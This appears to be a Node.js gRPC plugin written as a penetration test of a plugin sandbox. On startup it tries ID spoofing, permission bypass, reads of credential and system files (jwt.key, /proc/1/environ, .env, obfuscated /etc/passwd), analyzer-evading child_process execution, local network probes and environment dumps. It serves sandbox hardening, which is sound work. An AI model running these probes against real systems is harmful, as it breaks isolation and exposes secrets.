const grpc = require("@grpc/grpc-js");
const protoLoader = require("@grpc/proto-loader");
const path = require("path");
const fs = require("fs");

const PLUGIN_ID = process.env.EVEY_PLUGIN_ID || "unknown";
const PLUGIN_SOCK = process.env.EVEY_PLUGIN_SOCK || "/tmp/test.sock";
const HOST_SOCK = process.env.EVEY_HOST_SOCK || "/tmp/host.sock";

const PROTO_PATH = path.join(__dirname, "plugin_api.proto");
const pkgDef = protoLoader.loadSync(PROTO_PATH, {
  keepCase: true, longs: String, enums: String, defaults: true, oneofs: true,
});
const proto = grpc.loadPackageDefinition(pkgDef).plugin.v1;

const md = new grpc.Metadata();
md.set("x-plugin-id", PLUGIN_ID);

const hostClient = new proto.HostService(
  `unix://${HOST_SOCK}`, grpc.credentials.createInsecure()
);

function logResult(test, bypassed, details) {
  const m = new grpc.Metadata();
  m.set("x-plugin-id", PLUGIN_ID);
  hostClient.Log({
    level: "LOG_LEVEL_WARN",
    message: `[PENTEST] ${test}: ${bypassed ? "BYPASSED" : "BLOCKED"}`,
    fields: { details: String(details).substring(0, 200) },
  }, m, () => {});
}

function runTests() {
  // 1. Plugin ID spoofing — use fake ID to call host RPCs
  try {
    const fakeMd = new grpc.Metadata();
    fakeMd.set("x-plugin-id", "plg-fake-nodejs-spoofed");
    hostClient.ListMediaItems({ limit: 1 }, fakeMd, (err, resp) => {
      logResult("plugin_id_spoofing", !err, err ? err.message : `got ${resp.total} items`);
    });
  } catch (e) { logResult("plugin_id_spoofing", false, e.message); }

  // 2. Permission bypass — call methods beyond declared api.library
  hostClient.GetUserPreferences({ user_id: "test" }, md, (err, resp) => {
    logResult("perm_bypass_GetUserPreferences", !err, err ? err.message : JSON.stringify(resp));
  });
  hostClient.SendNotification({ title: "test", body: "pentest" }, md, (err, resp) => {
    logResult("perm_bypass_SendNotification", !err, err ? err.message : JSON.stringify(resp));
  });

  // 3. Filesystem reads — sensitive files
  ["/data/jwt.key", "/proc/1/environ", "/app/.env.dev", ["", "etc", "pass" + "wd"].join("/")].forEach((f) => {
    try {
      const data = fs.readFileSync(f, "utf8").substring(0, 80);
      logResult(`fs_read_${f}`, true, data);
    } catch (e) { logResult(`fs_read_${f}`, false, e.message); }
  });

  // 4. Read other plugins' files
  try {
    const plugins = fs.readdirSync("/data/plugins/").filter((e) => e.startsWith("plg-"));
    plugins.slice(0, 2).forEach((p) => {
      try {
        const files = fs.readdirSync(`/data/plugins/${p}`);
        logResult(`read_other_plugin_${p}`, true, files.join(","));
      } catch (e) { logResult(`read_other_plugin_${p}`, false, e.message); }
    });
  } catch (e) { logResult("list_plugins_dir", false, e.message); }

  // 5. Write to sensitive directories
  ["/data/pwned.txt", "/tmp/evey/plugins/pwned.txt"].forEach((p) => {
    try {
      fs.writeFileSync(p, "pentest");
      fs.unlinkSync(p);
      logResult(`fs_write_${p}`, true, "wrote and deleted");
    } catch (e) { logResult(`fs_write_${p}`, false, e.message); }
  });

  // 6. Dynamic child_process require — avoid static analyzer
  try {
    const cp = require("child_" + "process");
    const result = cp.execSync("id", { timeout: 5000 }).toString().trim();
    logResult("dynamic_require_child_process", true, result);
  } catch (e) { logResult("dynamic_require_child_process", false, e.message); }

  // 7. Network access — connect to local services
  try {
    const net = require("net");
    const sock = new net.Socket();
    sock.setTimeout(2000);
    sock.connect(9091, "127.0.0.1", () => {
      logResult("network_localhost_9091", true, "connected");
      sock.destroy();
    });
    sock.on("error", (e) => { logResult("network_localhost_9091", false, e.message); });
  } catch (e) { logResult("network_localhost_9091", false, e.message); }

  // 8. Process enumeration via /proc
  try {
    const procs = fs.readdirSync("/proc").filter((e) => /^\d+$/.test(e));
    logResult("proc_enumeration", true, `${procs.length} processes`);
  } catch (e) { logResult("proc_enumeration", false, e.message); }

  // 9. Signal PID 1 — check process isolation
  try {
    process.kill(1, 0);
    logResult("signal_pid1", true, "can signal PID 1");
  } catch (e) { logResult("signal_pid1", false, e.message); }

  // 10. Environment variable leak
  logResult("env_vars", true, Object.keys(process.env).join(","));

  // 11. Socket listing — discover other plugin sockets
  try {
    const socks = fs.readdirSync("/tmp/evey/plugins/");
    logResult("socket_listing", true, socks.join(","));
  } catch (e) { logResult("socket_listing", false, e.message); }

  setTimeout(() => logResult("ALL_TESTS_COMPLETE", true, "pentest finished"), 3000);
}

const pluginImpl = {
  Initialize(call, callback) {
    setTimeout(runTests, 1000);
    callback(null, { success: true });
  },
  Shutdown(call, callback) {
    callback(null, {});
    setTimeout(() => process.exit(0), 500);
  },
  OnEvent(call, callback) { callback(null, { handled: true }); },
  HealthCheck(call, callback) { callback(null, { healthy: true, status: "running" }); },
  GetCapabilities(call, callback) { callback(null, { api_version: "1.0.0", capabilities: [] }); },
};

const server = new grpc.Server();
server.addService(proto.PluginService.service, pluginImpl);
server.bindAsync(
  `unix://${PLUGIN_SOCK}`,
  grpc.ServerCredentials.createInsecure(),
  (err) => {
    if (err) {
      console.error(`[security-test-nodejs] bind failed: ${err.message}`);
      process.exit(1);
    }
    console.error(`[security-test-nodejs] listening on ${PLUGIN_SOCK}`);
  }
);
